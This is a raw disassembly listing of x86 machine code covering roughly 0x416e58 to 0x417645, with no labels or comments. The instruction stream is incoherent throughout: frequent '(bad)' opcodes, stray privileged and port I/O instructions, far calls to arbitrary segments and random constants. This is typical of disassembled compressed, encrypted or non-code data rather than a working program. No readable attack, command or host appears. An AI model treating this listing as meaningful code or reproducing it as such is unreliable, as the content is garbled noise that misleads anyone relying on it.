  416e58:	sub    dh,cl
  416e5a:	jp     0x416e42
  416e5c:	push   ss
  416e5d:	loopne 0x416ea0
  416e5f:	bound  ebp,QWORD PTR [ebp+esi*8+0x7f]
  416e63:	mov    esi,eax
  416e65:	add    edi,DWORD PTR [edi+0x434c9dad]
  416e6b:	mov    fs,esp
  416e6d:	test   al,0xc1
  416e6f:	jmp    0x416ee1
  416e71:	mov    ecx,0x66b21174
  416e76:	lods   eax,DWORD PTR ds:[esi]
  416e77:	imul   esi,DWORD PTR [ecx-0x55],0xaa2f66f8
  416e7e:	mov    DWORD PTR [esi+0x6baae5c7],esp
  416e84:	mov    esi,esp
  416e86:	add    ebp,DWORD PTR [ebx+0x38]
  416e89:	iret   
  416e8a:	fist   WORD PTR [ecx+0x28]
  416e8d:	(bad)
  416e90:	in     al,dx
  416e91:	dec    esp
  416e92:	jae    0x416e8d
  416e94:	dec    edi
  416e95:	sbb    BYTE PTR [eax+eax*2-0x229cdbef],0x5c
  416e9d:	fimul  DWORD PTR [edi-0x7e]
  416ea0:	call   0xb5fc:0x52627b97
  416ea7:	stos   BYTE PTR es:[edi],al
  416ea8:	ficomp WORD PTR [ecx]
  416eaa:	clc    
  416eab:	lods   al,BYTE PTR ds:[esi]
  416eac:	inc    ebx
  416ead:	xchg   ecx,eax
  416eae:	lock dec ecx
  416eb0:	pushf  
  416eb1:	daa    
  416eb2:	addr16 push edi
  416eb4:	ret    
  416eb5:	ins    BYTE PTR es:[edi],dx
  416eb6:	aas    
  416eb7:	xor    eax,0x7c31dce8
  416ebc:	push   ds
  416ebd:	fwait
  416ebe:	jmp    0x1ebe50b2
  416ec3:	mov    ebx,0x19582e70
  416ec8:	mov    eax,0xd102cdc8
  416ecd:	dec    edx
  416ece:	sub    eax,0x9ea0ad3e
  416ed3:	mov    ecx,DWORD PTR [eax+0x7f]
  416ed6:	sti    
  416ed7:	lahf   
  416ed8:	stc    
  416ed9:	sub    al,0xaa
  416edb:	lea    esi,[ecx+0x76]
  416ede:	adc    edi,edx
  416ee0:	add    al,0x35
  416ee2:	rol    BYTE PTR [ebx+0x58],0xb9
  416ee6:	pop    esp
  416ee7:	iret   
  416ee8:	(bad)  
  416ee9:	mov    es,WORD PTR [ebx+0x4f]
  416eec:	(bad)  
  416eed:	(bad)  
  416eef:	hlt    
  416ef0:	fmul   QWORD PTR [eax+0x22]
  416ef3:	jecxz  0x416f31
  416ef5:	mov    dl,0x85
  416ef7:	mov    esi,0x27942d0
  416efc:	cmp    ch,dl
  416efe:	sahf   
  416eff:	cmp    al,0x28
  416f01:	adc    edi,edx
  416f03:	fdiv   QWORD PTR [edx+esi*8-0x777e838e]
  416f0a:	setle  BYTE PTR [ebp+eax*8-0x5c]
  416f0f:	stc    
  416f10:	fild   QWORD PTR [eax-0x29]
  416f13:	jo     0x416ee6
  416f15:	add    al,0xd
  416f17:	jo     0x416f12
  416f19:	xchg   ebp,eax
  416f1a:	cld    
  416f1b:	xchg   edi,eax
  416f1c:	pop    ebx
  416f1d:	xor    DWORD PTR [ecx],ebx
  416f1f:	dec    esp
  416f20:	stos   BYTE PTR es:[edi],al
  416f21:	repz inc esp
  416f23:	add    dh,ch
  416f25:	pushf  
  416f26:	push   DWORD PTR [esi-0x7495a07d]
  416f2c:	leave  
  416f2d:	inc    esp
  416f2e:	ins    DWORD PTR es:[edi],dx
  416f2f:	(bad)  
  416f30:	mov    ecx,ss
  416f32:	fnsave [edi]
  416f34:	mov    dh,0x11
  416f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f37:	ss mov eax,0xc46125ad
  416f3d:	sbb    eax,0x5ec54174
  416f42:	mov    dl,0xf3
  416f44:	add    eax,0xb75e7d99
  416f49:	and    eax,DWORD PTR [eax-0x55]
  416f4c:	scas   al,BYTE PTR es:[edi]
  416f4d:	mov    edi,0x67f5463a
  416f52:	jo     0x416f84
  416f54:	scas   al,BYTE PTR es:[edi]
  416f55:	sub    al,0xa8
  416f57:	cdq    
  416f58:	call   0x7c84:0xfc98ae68
  416f5f:	add    BYTE PTR ds:0x29ead98e,al
  416f65:	sub    al,0x25
  416f67:	adc    eax,0x5d1c88da
  416f6c:	shr    edx,0x41
  416f6f:	pop    ebp
  416f70:	aaa    
  416f71:	pop    eax
  416f72:	pusha  
  416f73:	dec    esi
  416f74:	jne    0x416f6c
  416f76:	mov    bl,0xd0
  416f78:	inc    eax
  416f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f7a:	fstp   QWORD PTR [edi+0x2ad576a1]
  416f80:	loop   0x416f7f
  416f82:	outs   dx,DWORD PTR ds:[esi]
  416f83:	daa    
  416f84:	(bad)  
  416f85:	js     0x416f86
  416f87:	test   al,0x5d
  416f89:	and    BYTE PTR [ebx-0x1b09a454],al
  416f8f:	inc    eax
  416f90:	pop    edi
  416f91:	ror    DWORD PTR [ecx],1
  416f93:	dec    ebx
  416f94:	or     DWORD PTR [ebx+ebx*2],0xffffffc4
  416f98:	jno    0x416f6a
  416f9a:	sub    eax,0x70c3dd59
  416f9f:	aam    0x84
  416fa1:	mov    ss,WORD PTR [esi-0x5671d879]
  416fa7:	push   ebx
  416fa8:	retf   
  416fa9:	iret   
  416faa:	loopne 0x416f8c
  416fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fad:	out    0xe7,eax
  416faf:	ja     0x416fe3
  416fb1:	push   eax
  416fb2:	or     DWORD PTR [esi+0x71],edx
  416fb5:	push   esi
  416fb6:	dec    esp
  416fb7:	mov    DWORD PTR [ebx-0x6888fdc2],ecx
  416fbd:	cs push edx
  416fbf:	rcr    BYTE PTR [esi-0x2baa5804],0x1e
  416fc6:	mov    edi,0xaf124399
  416fcb:	push   cs
  416fcc:	add    eax,0xb283b54a
  416fd1:	and    ah,BYTE PTR ds:0xe6af24ac
  416fd7:	test   cl,cl
  416fd9:	dec    esp
  416fda:	repz sub BYTE PTR [eax],cl
  416fdd:	xor    ah,dh
  416fdf:	push   0x3b97678e
  416fe4:	add    dh,BYTE PTR [esi+0x619da339]
  416fea:	mov    edx,0xce3d7698
  416fef:	mov    al,BYTE PTR [ecx+0x3c]
  416ff2:	mov    esp,DWORD PTR [ecx-0x6a557d31]
  416ff8:	idiv   BYTE PTR [esp+eax*2]
  416ffb:	mov    al,ds:0x2615e426
  417000:	and    al,0xc5
  417002:	push   es
  417003:	and    edx,DWORD PTR [edi+ecx*8+0x15]
  417007:	lea    eax,[eax]
  417009:	or     ch,bh
  41700b:	fdivp  st(2),st
  41700d:	neg    BYTE PTR [edi-0x6b453262]
  417013:	cmp    al,0xc5
  417015:	jbe    0x416fcf
  417017:	outs   dx,DWORD PTR ds:[esi]
  417018:	inc    ebx
  417019:	rcl    dl,cl
  41701b:	arpl   WORD PTR [esi+ebx*2-0x4],si
  41701f:	mov    eax,0x1bf0c751
  417024:	inc    esi
  417025:	add    eax,0x469f8b6b
  41702a:	cdq    
  41702b:	add    eax,0x416bd62
  417030:	aaa    
  417031:	mov    esp,0x9122be19
  417036:	dec    ebp
  417037:	add    ch,ch
  417039:	pop    esi
  41703a:	inc    edx
  41703b:	mov    ebx,0x6b00e738
  417040:	stos   BYTE PTR es:[edi],al
  417041:	push   ebx
  417042:	popf   
  417043:	add    eax,0x3fda429e
  417048:	rcl    DWORD PTR [edx-0x2cf94b92],1
  41704e:	pop    DWORD PTR cs:[eax]
  417051:	aaa    
  417052:	inc    esp
  417053:	jmp    0x417096
  417055:	adc    eax,0x2c64679d
  41705a:	call   0x646b:0x5b01d2a7
  417061:	adc    BYTE PTR [edx+eiz*8-0x5a7e2a59],0xd2
  417069:	mov    bh,0x63
  41706b:	pop    ebx
  41706c:	call   0xfe44:0x6b213b6f
  417073:	pop    es
  417074:	outs   dx,BYTE PTR ds:[esi]
  417075:	sub    DWORD PTR [edx+0x36],0x521ceec5
  41707c:	pushf  
  41707d:	mov    dh,BYTE PTR [ecx]
  41707f:	inc    ecx
  417080:	fldenv [esi-0x1c49442e]
  417086:	xchg   esp,eax
  417087:	push   es
  417088:	cmp    BYTE PTR [ebx+edi*4-0x14fb3bfc],dh
  41708f:	aam    0x92
  417091:	cmp    eax,0xeb1a2ed4
  417096:	(bad)  
  417097:	fisttp WORD PTR [esi-0x333c0495]
  41709d:	or     eax,0xf4615ff0
  4170a2:	retf   
  4170a3:	into   
  4170a4:	mov    DWORD PTR [ebx+0x77],eax
  4170a7:	dec    eax
  4170a8:	ror    BYTE PTR [edi+esi*1+0x23],cl
  4170ac:	js     0x41711c
  4170ae:	mov    ah,BYTE PTR [ebp+esi*2+0x5d98e367]
  4170b5:	xchg   ecx,eax
  4170b6:	xchg   edx,eax
  4170b7:	dec    ecx
  4170b8:	sub    eax,0x3ec6d018
  4170bd:	jo     0x41705f
  4170bf:	aam    0x53
  4170c1:	inc    esi
  4170c2:	or     BYTE PTR [ebp-0x39],dh
  4170c5:	pushf  
  4170c6:	push   ss
  4170c7:	xchg   esi,eax
  4170c8:	mov    ebx,ss
  4170ca:	inc    ecx
  4170cb:	mov    bh,0x79
  4170cd:	jmp    0xdee7271f
  4170d2:	xchg   DWORD PTR [eax],edx
  4170d4:	fldcw  WORD PTR [ecx-0x1a0099d1]
  4170da:	push   cs
  4170db:	xor    eax,0xdb1d28bb
  4170e0:	fidiv  WORD PTR [ecx-0x21d63cbf]
  4170e6:	push   ebx
  4170e7:	sbb    ebx,DWORD PTR [edx]
  4170e9:	xor    dh,al
  4170eb:	pop    esp
  4170ec:	loop   0x417076
  4170ee:	daa    
  4170ef:	shl    DWORD PTR [edx-0x1c5b5a8a],0x36
  4170f6:	mov    ds:0xc3019c8a,al
  4170fb:	add    esi,DWORD PTR [esi+edi*1-0x5c]
  4170ff:	in     eax,0xc7
  417101:	aaa    
  417102:	adc    eax,0x7754dc5
  417107:	or     bl,BYTE PTR [ecx-0xa43cb58]
  41710d:	daa    
  41710e:	and    eax,0x272fdb06
  417113:	mov    edx,0xe7d0b1af
  417118:	sar    DWORD PTR [edi+edi*4],cl
  41711b:	sub    eax,0xe51b4635
  417120:	dec    ecx
  417121:	ficom  WORD PTR [ebx+0x3c]
  417124:	clc    
  417125:	mov    bh,0xbb
  417127:	mov    ch,0x78
  417129:	lods   eax,DWORD PTR ds:[esi]
  41712a:	mov    dh,0xfa
  41712c:	(bad)  
  41712d:	int    0x84
  41712f:	push   eax
  417130:	mov    ecx,0xc5b75335
  417135:	lods   eax,DWORD PTR ds:[esi]
  417136:	fwait
  417137:	cmp    ebp,DWORD PTR [esi-0x58]
  41713a:	(bad)  
  41713b:	pop    ss
  41713c:	or     eax,0xe7e63dcc
  417141:	and    al,0xf1
  417143:	xchg   ecx,edx
  417145:	(bad)  
  417146:	das    
  417147:	mov    bl,0x1c
  417149:	cmp    eax,0xeac834ad
  41714e:	pop    edx
  41714f:	int    0x5d
  417151:	add    BYTE PTR [eax+0x44],al
  417154:	stos   DWORD PTR es:[edi],eax
  417155:	in     al,0x1a
  417157:	dec    edx
  417158:	or     DWORD PTR [edi-0x6bd48cb6],0x47f6709e
  417162:	in     eax,0xc8
  417164:	int3   
  417165:	nop
  417166:	mov    al,ds:0x5308ccb9
  41716b:	loop   0x417141
  41716d:	push   ecx
  41716e:	ret    0xa331
  417171:	cmp    DWORD PTR [ecx+0x3c],ebp
  417174:	stos   BYTE PTR es:[edi],al
  417175:	(bad)  
  417177:	fistp  DWORD PTR [ebp-0x5cb13494]
  41717d:	rcr    BYTE PTR [esi],0x1e
  417180:	pop    ds
  417181:	mov    ebx,0x37a318e9
  417186:	ror    BYTE PTR [edi+0x7ae5af3f],1
  41718c:	ins    BYTE PTR es:[edi],dx
  41718d:	dec    ebx
  41718e:	cmc    
  41718f:	cli    
  417190:	mov    al,ds:0x9f17a391
  417195:	pop    edx
  417196:	sbb    BYTE PTR ds:0x8c5e2a09,bl
  41719c:	sub    eax,DWORD PTR [ebx+ebx*4]
  41719f:	popa   
  4171a0:	mov    bh,0x26
  4171a2:	mov    dl,0x2e
  4171a4:	pop    esp
  4171a5:	ins    DWORD PTR es:[edi],dx
  4171a6:	mov    esp,DWORD PTR [ebp+0xe]
  4171a9:	dec    esp
  4171aa:	cmp    edi,DWORD PTR [ebp-0x3834b818]
  4171b0:	add    al,BYTE PTR [ebx-0x3b1e959b]
  4171b6:	and    dh,BYTE PTR [ebx+eiz*1-0x27a110ad]
  4171bd:	test   BYTE PTR [edi+0x67dba2ee],bl
  4171c3:	adc    eax,0xdfff5200
  4171c8:	pop    ds
  4171c9:	mov    bh,BYTE PTR [ebp-0x2f]
  4171cc:	push   ss
  4171cd:	loope  0x417163
  4171cf:	xor    DWORD PTR gs:[edx-0x15],ebp
  4171d3:	and    BYTE PTR [edx],0xdd
  4171d6:	in     eax,dx
  4171d7:	bound  ebx,QWORD PTR [edx-0x26f77fec]
  4171dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171de:	pop    ebx
  4171df:	add    DWORD PTR [eax],edi
  4171e1:	dec    ebp
  4171e2:	mov    ebx,0x7d3a8f0d
  4171e7:	mov    edx,0xf15501ec
  4171ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ed:	add    BYTE PTR [esi*2-0x646087e9],dl
  4171f4:	xor    esi,DWORD PTR [edx+0x8]
  4171f7:	adc    DWORD PTR [esi],ebp
  4171f9:	(bad)
  4171fc:	mov    eax,ds:0x97809fb6
  417201:	push   ss
  417202:	ret    
  417203:	pop    edi
  417204:	pop    ss
  417205:	jmp    0xfe45:0xb2c3d40b
  41720c:	(bad)  
  41720d:	ja     0x41727f
  41720f:	jb     0x4171f6
  417211:	les    ecx,FWORD PTR [ebx-0x3c]
  417214:	inc    BYTE PTR [edi]
  417216:	push   ebp
  417217:	rcr    DWORD PTR [ebx],0xd5
  41721a:	mov    eax,ds:0x3f182006
  41721f:	push   eax
  417220:	adc    eax,0xecf2e33f
  417225:	mov    dl,BYTE PTR [edx+0x721580f4]
  41722b:	cmp    edi,DWORD PTR [edx+0x94a1b11]
  417231:	xchg   esp,eax
  417232:	jle    0x417222
  417234:	scas   eax,DWORD PTR es:[edi]
  417235:	cmp    DWORD PTR [eax+edi*8],esp
  417238:	add    ebx,ebp
  41723a:	(bad)  [ecx]
  41723c:	push   ss
  41723d:	lea    ecx,[esi]
  41723f:	ror    DWORD PTR [edx],cl
  417241:	ror    edi,1
  417243:	dec    ecx
  417244:	mov    ds,WORD PTR [edi+0xf]
  417247:	and    edx,esp
  417249:	ret    0xee43
  41724c:	mov    edi,DWORD PTR [ecx-0x56]
  41724f:	int    0xde
  417251:	loop   0x41729d
  417253:	mov    ebx,0x8563d0c9
  417258:	or     al,0x81
  41725a:	mov    ah,0x94
  41725c:	mov    dl,0x23
  41725e:	and    cl,BYTE PTR [edi+0x4b]
  417261:	clc    
  417262:	mov    ebx,0xcb27d983
  417267:	test   eax,0x307af596
  41726c:	xor    DWORD PTR [esi],esi
  41726e:	cmp    DWORD PTR [ebp-0x12bd6665],ebp
  417274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417275:	retf   0xa4e8
  417278:	jae    0x4172d3
  41727a:	dec    ebx
  41727b:	inc    esi
  41727c:	jmp    0x2996:0x273fdbbb
  417283:	xchg   edx,eax
  417284:	jb     0x417231
  417286:	mov    esp,0xc6253a99
  41728b:	xlat   BYTE PTR ds:[ebx]
  41728c:	ds imul edi,edi,0x8ad2a6b3
  417293:	mov    ecx,0xf76b9197
  417298:	and    DWORD PTR [eax],edx
  41729a:	(bad)  
  41729b:	jp     0x417252
  41729d:	shl    DWORD PTR [ebx+0x45ef6d97],1
  4172a3:	scas   al,BYTE PTR es:[edi]
  4172a4:	jns    0x417284
  4172a6:	xor    DWORD PTR [ebx],0xffffffd0
  4172a9:	jmp    0x4177bb
  4172ae:	(bad)  
  4172af:	leave  
  4172b0:	int3   
  4172b1:	leave  
  4172b2:	rcr    ecx,1
  4172b4:	fxch   st(1)
  4172b6:	aad    0x44
  4172b8:	push   esp
  4172b9:	adc    eax,0xb596a7c0
  4172be:	ror    esp,1
  4172c0:	jg     0x41733a
  4172c2:	jae    0x417340
  4172c4:	js     0x41733e
  4172c6:	mov    ecx,0xc11e5ab5
  4172cb:	rol    ecx,1
  4172cd:	jl     0x417346
  4172cf:	add    eax,0x1eaa39eb
  4172d4:	pop    esi
  4172d5:	pusha  
  4172d6:	scas   al,BYTE PTR es:[edi]
  4172d7:	iret   
  4172d8:	and    esi,DWORD PTR [ebx+0x61b70a03]
  4172de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172df:	hlt    
  4172e0:	jae    0x4172ec
  4172e2:	shr    BYTE PTR [eax],cl
  4172e4:	xchg   edx,eax
  4172e5:	jp     0x417306
  4172e7:	call   0xa1a5b196
  4172ec:	sub    al,0xb8
  4172ee:	cs call 0xa908:0x60e248af
  4172f6:	dec    ecx
  4172f7:	mov    eax,0x485be004
  4172fc:	stc    
  4172fd:	xor    eax,0x250c4e9a
  417302:	cmc    
  417303:	pop    edx
  417304:	inc    eax
  417305:	mov    al,0x83
  417307:	mov    ebx,0xa7bcd855
  41730c:	aad    0x13
  41730e:	push   esi
  41730f:	mov    edi,0xb60a55b8
  417314:	gs push ds
  417316:	jne    0x4172b3
  417318:	pop    edx
  417319:	or     al,0xc7
  41731b:	pushf  
  41731c:	or     dl,cl
  41731e:	sbb    esp,edi
  417320:	cwde   
  417321:	or     eax,0xeea73c0
  417326:	jl     0x4172d3
  417328:	sub    edx,DWORD PTR [edi+0x1dbb6b7c]
  41732e:	pop    DWORD PTR [ebp-0xa]
  417331:	mov    eax,ss
  417333:	je     0x417354
  417335:	(bad)  
  417336:	in     eax,0xc5
  417338:	popf   
  417339:	jns    0x41732a
  41733b:	sahf   
  41733c:	mov    ds:0x51643481,al
  417341:	call   0xde9ed11
  417346:	ss cmp al,0xfb
  417349:	mov    WORD PTR [esp+ebx*8+0x38],cs
  41734d:	mov    eax,0x8ad505fb
  417352:	xor    BYTE PTR [ecx],ah
  417354:	into   
  417355:	jns    0x417322
  417357:	jmp    0x4c88:0x9c4fc1b5
  41735e:	adc    BYTE PTR [ebp-0x73],dl
  417361:	pop    eax
  417362:	and    ebx,DWORD PTR [esi]
  417364:	dec    ecx
  417365:	sub    BYTE PTR [eax],dh
  417367:	pop    esi
  417368:	jle    0x4173d7
  41736a:	mov    cl,0x48
  41736c:	out    dx,al
  41736d:	push   ecx
  41736e:	dec    ebp
  41736f:	or     al,0x52
  417371:	ds push ebp
  417373:	in     eax,0x8c
  417375:	xchg   ebx,eax
  417376:	and    DWORD PTR [edx-0x16a134f8],edi
  41737c:	mov    dl,0x0
  41737e:	mov    al,0x65
  417380:	and    ebp,ebp
  417382:	js     0x417322
  417384:	push   ds
  417385:	sub    al,BYTE PTR [edi+0x18]
  417388:	xlat   BYTE PTR cs:[ebx]
  41738a:	lea    edi,[edi+0x1d]
  41738d:	dec    edi
  41738e:	ror    DWORD PTR [ecx],0x95
  417391:	rcr    dl,1
  417393:	dec    edx
  417394:	add    al,0xf8
  417396:	arpl   WORD PTR cs:[eax-0x5f],cx
  41739a:	pop    eax
  41739b:	addr16 (bad) 
  41739d:	imul   esi,DWORD PTR [ecx+edx*2],0x3f634956
  4173a4:	push   cs
  4173a5:	adc    dl,BYTE PTR [ebx]
  4173a7:	dec    esi
  4173a8:	add    ebp,DWORD PTR [ecx]
  4173aa:	xor    DWORD PTR [esi],ecx
  4173ac:	pushf  
  4173ad:	scas   al,BYTE PTR es:[edi]
  4173ae:	out    0x76,eax
  4173b0:	cmp    eax,0x6638e06e
  4173b5:	add    eax,0x351a8f95
  4173ba:	gs pop esp
  4173bc:	sbb    DWORD PTR ds:[edi+0x57],ecx
  4173c0:	cdq    
  4173c1:	in     al,0xa4
  4173c3:	or     BYTE PTR [ecx],dh
  4173c5:	and    al,0x85
  4173c7:	push   0x2f
  4173c9:	scas   al,BYTE PTR es:[edi]
  4173ca:	jmp    0x4173fd
  4173cc:	ret    0xf36f
  4173cf:	add    BYTE PTR [ebx-0x2c3e6d19],al
  4173d5:	pop    ebx
  4173d6:	mov    bl,0x4e
  4173d8:	int3   
  4173d9:	leave  
  4173da:	jne    0x417405
  4173dc:	rcr    DWORD PTR [ebx-0x692b3ebf],0xae
  4173e3:	pop    eax
  4173e4:	or     dl,BYTE PTR [edx]
  4173e6:	jo     0x417410
  4173e8:	jle    0x417414
  4173ea:	xchg   ebp,eax
  4173eb:	outs   dx,DWORD PTR ds:[esi]
  4173ec:	fidiv  DWORD PTR [edi-0x7a025942]
  4173f2:	fimul  WORD PTR [ecx+0x5e]
  4173f5:	jns    0x41744c
  4173f7:	mov    cl,0xbb
  4173f9:	(bad)  
  4173fa:	enter  0xa65,0xf
  4173fe:	jecxz  0x41742d
  417400:	fdivr  QWORD PTR [ebx-0x33]
  417403:	out    0xa5,al
  417405:	xchg   DWORD PTR [ebx+0x6d],ebp
  417408:	xchg   edi,eax
  417409:	inc    ebp
  41740a:	outs   dx,BYTE PTR ds:[esi]
  41740b:	shr    BYTE PTR [eax],0x9a
  41740e:	mov    ds:0x2a98042,al
  417413:	icebp  
  417414:	dec    edi
  417415:	enter  0x4904,0xf8
  417419:	or     esi,DWORD PTR [eax]
  41741b:	inc    edx
  41741c:	ins    BYTE PTR es:[edi],dx
  41741d:	fnsave [ebx-0x63]
  417420:	(bad)  
  417421:	clc    
  417422:	jmp    0x930d:0x607e3ee7
  417429:	iret   
  41742a:	jns    0x417494
  41742c:	pop    ds
  41742d:	ret    0x7f4e
  417430:	mov    bl,0x1d
  417432:	pop    ecx
  417433:	int    0x18
  417435:	xor    BYTE PTR [edx+0x229206c5],0x7a
  41743c:	xor    cl,bl
  41743e:	xchg   ebx,eax
  41743f:	mov    ds:0x594e6987,eax
  417444:	dec    edx
  417445:	jb     0x4173d1
  417447:	pushf  
  417448:	pop    ss
  417449:	mov    ah,0xe
  41744b:	pop    ebx
  41744c:	xchg   ebp,eax
  41744d:	adc    eax,0xd5630439
  417452:	in     al,0xa8
  417454:	xchg   ebp,eax
  417455:	outs   dx,BYTE PTR ds:[esi]
  417456:	in     eax,0x70
  417458:	sub    dh,BYTE PTR [edi]
  41745a:	aam    0x94
  41745c:	push   ebx
  41745d:	frstor [esi-0x80]
  417460:	xor    BYTE PTR [edi],bh
  417462:	xchg   esi,eax
  417463:	out    dx,eax
  417464:	xchg   esp,eax
  417465:	lahf   
  417466:	test   eax,0xf5bb9d8
  41746b:	mov    ds:0x7d0d8d66,al
  417470:	and    eax,0xdb3dd293
  417475:	loop   0x417424
  417477:	push   ebx
  417478:	lahf   
  417479:	jae    0x4174f7
  41747b:	jno    0x417475
  41747d:	push   ebp
  41747e:	fbstp  TBYTE PTR [ecx-0x300f0fc6]
  417484:	push   ds
  417485:	test   bh,bh
  417487:	fnclex 
  417489:	cmp    eax,0xfbd8b814
  41748e:	and    eax,0x2536cfcf
  417493:	mov    cl,0x47
  417495:	or     edi,DWORD PTR [ecx-0x4]
  417498:	aas    
  417499:	out    dx,eax
  41749a:	fst    QWORD PTR [edx+eax*2]
  41749d:	and    esp,DWORD PTR [eax+0x73a2bc3a]
  4174a3:	adc    BYTE PTR [esi],0xe9
  4174a6:	jae    0x417487
  4174a8:	jmp    FWORD PTR [ecx]
  4174aa:	pop    esi
  4174ab:	dec    eax
  4174ac:	loopne 0x417528
  4174ae:	fsubr  st,st(2)
  4174b0:	fwait
  4174b1:	js     0x417462
  4174b3:	adc    al,0x23
  4174b5:	inc    eax
  4174b6:	popf   
  4174b7:	lock je 0x4174e5
  4174ba:	aaa    
  4174bb:	into   
  4174bc:	outs   dx,DWORD PTR ds:[esi]
  4174bd:	sub    DWORD PTR [ebx+0x3d],edx
  4174c0:	push   eax
  4174c1:	(bad)  
  4174c2:	mov    al,ds:0x44a87039
  4174c7:	cmp    DWORD PTR [ecx],esp
  4174c9:	sub    eax,0xe1e5fbe9
  4174ce:	mov    ds:0x5454574b,eax
  4174d3:	call   0x8cee829c
  4174d8:	push   eax
  4174d9:	jp     0x4174ce
  4174db:	pop    ebx
  4174dc:	pop    ebp
  4174dd:	scas   al,BYTE PTR es:[edi]
  4174de:	ret    0xa8b3
  4174e1:	add    BYTE PTR ds:[eax],ah
  4174e4:	rcr    DWORD PTR [ecx-0x53a625f2],1
  4174ea:	jmp    0xc9f8069a
  4174ef:	xchg   ebx,eax
  4174f0:	jl     0x417529
  4174f2:	and    DWORD PTR [ecx-0x31],ebx
  4174f5:	mov    eax,0x228c9fe9
  4174fa:	scas   al,BYTE PTR es:[edi]
  4174fb:	clc    
  4174fc:	cmp    ah,bh
  4174fe:	(bad)  
  4174ff:	loope  0x41748d
  417501:	jecxz  0x4174d7
  417503:	dec    eax
  417504:	dec    esi
  417505:	loopne 0x4174cb
  417507:	push   edi
  417508:	iret   
  417509:	pop    esi
  41750a:	or     DWORD PTR [edx+0x2b],ebx
  41750d:	(bad)  
  41750e:	jmp    0x62f2:0x651cd0c4
  417515:	mov    dl,0x21
  417517:	mov    dl,BYTE PTR [edx-0x371e936c]
  41751d:	dec    eax
  41751e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41751f:	add    bh,dl
  417521:	jnp    0x417506
  417523:	push   ebp
  417524:	mov    esp,es
  417526:	fisttp QWORD PTR [esi]
  417528:	cli    
  417529:	stc    
  41752a:	dec    ecx
  41752b:	jb     0x417528
  41752d:	and    eax,0x599250c9
  417532:	cmp    BYTE PTR [ebp-0x17],cl
  417535:	sbb    BYTE PTR [edi+0x256e69db],cl
  41753b:	mov    dh,0xe2
  41753d:	or     ebx,DWORD PTR [eax-0x281e7c9d]
  417543:	cwde   
  417544:	pop    eax
  417545:	mov    ah,BYTE PTR [ecx+0x211a7997]
  41754b:	cmc    
  41754c:	ss outs dx,BYTE PTR gs:[esi]
  41754f:	out    0xb4,al
  417551:	mov    esp,0x40ef9565
  417556:	mov    edi,0x6b112073
  41755b:	or     bl,BYTE PTR ds:0x874477b5
  417561:	ds cdq 
  417563:	dec    ecx
  417564:	daa    
  417565:	sub    BYTE PTR [esi+0x26],dh
  417568:	mov    bl,0x57
  41756a:	xchg   ebx,eax
  41756b:	jmp    0xf10ba2d8
  417570:	leave  
  417571:	push   ss
  417572:	pop    ss
  417573:	sub    bl,cl
  417575:	jg     0x417548
  417577:	mov    bl,0x2f
  417579:	xchg   ecx,eax
  41757a:	nop
  41757b:	enter  0x533e,0x4f
  41757f:	out    dx,al
  417580:	stos   DWORD PTR es:[edi],eax
  417581:	or     BYTE PTR [ecx],ah
  417583:	(bad)  
  417584:	int    0x3a
  417586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417587:	fdivr  QWORD PTR [edi+0x33]
  41758a:	xchg   ecx,ebx
  41758c:	jmp    0x417526
  41758e:	mov    WORD PTR [ebx+0x44346048],es
  417594:	pop    edi
  417595:	xor    eax,0x49f6e4dc
  41759a:	loop   0x4175a5
  41759c:	loope  0x4175d0
  41759e:	sub    al,0x40
  4175a0:	mov    DWORD PTR [edi-0x1a7f0ccf],ebx
  4175a6:	push   esp
  4175a7:	xchg   ecx,eax
  4175a8:	(bad)  
  4175a9:	push   esi
  4175aa:	mov    dh,0xc1
  4175ac:	mov    al,ds:0x49bd49a7
  4175b1:	xchg   DWORD PTR [eax+0x518af675],esp
  4175b7:	ja     0x417592
  4175b9:	or     DWORD PTR [edx-0x79],ebx
  4175bc:	rcl    DWORD PTR [eax+0x72f8316d],0x1a
  4175c3:	fmul   st(7),st
  4175c5:	cmp    al,0x4f
  4175c7:	pop    es
  4175c8:	push   0xc05e77de
  4175cd:	test   al,0xb
  4175cf:	popa   
  4175d0:	pop    ss
  4175d1:	fist   WORD PTR [ebx]
  4175d3:	push   0x84bca2e9
  4175d8:	jbe    0x4175eb
  4175da:	sahf   
  4175db:	leave  
  4175dc:	xchg   edi,eax
  4175dd:	cmp    eax,DWORD PTR [edi+edi*2]
  4175e0:	data16 fidiv DWORD PTR [eax]
  4175e3:	jmp    0x4175ea
  4175e5:	dec    ebp
  4175e6:	xchg   edx,eax
  4175e7:	inc    edi
  4175e8:	popf   
  4175e9:	xor    eax,esp
  4175eb:	xor    edx,DWORD PTR [ecx-0x5f]
  4175ee:	in     eax,0xb6
  4175f0:	inc    eax
  4175f1:	and    bh,BYTE PTR [esi-0x1d]
  4175f4:	cli    
  4175f5:	mov    WORD PTR [edi+0x7680b308],ds
  4175fb:	xchg   ebp,eax
  4175fc:	sbb    ch,BYTE PTR [edx-0x61b095b1]
  417602:	rcr    DWORD PTR [ebp+eiz*2+0x26e2b1e6],cl
  417609:	mov    ebx,0x8ccfbf0d
  41760e:	dec    ebx
  41760f:	out    dx,al
  417610:	push   ds
  417611:	adc    cl,ah
  417613:	jg     0x4175cb
  417615:	sbb    BYTE PTR [ebx-0x34e9afe3],0xab
  41761c:	xchg   edx,eax
  41761d:	test   al,0x38
  41761f:	mov    DWORD PTR [eax],edx
  417621:	sub    BYTE PTR [edi-0x614a7613],0x82
  417628:	fdivr  DWORD PTR [eax]
  41762a:	iret   
  41762b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41762c:	lods   al,BYTE PTR ds:[esi]
  41762d:	sub    edx,DWORD PTR ds:0x1ad3ab7d
  417633:	popa   
  417634:	jge    0x41769a
  417636:	stos   DWORD PTR es:[edi],eax
  417637:	adc    al,0xa4
  417639:	or     dh,BYTE PTR [ebx+edx*2]
  41763c:	pusha  
  41763d:	(bad)  
  41763e:	xchg   edi,eax
  41763f:	in     al,0x20
  417641:	dec    esp
  417642:	xchg   BYTE PTR [edx+0x6c],al
  417645:	xchg   ebx,eax
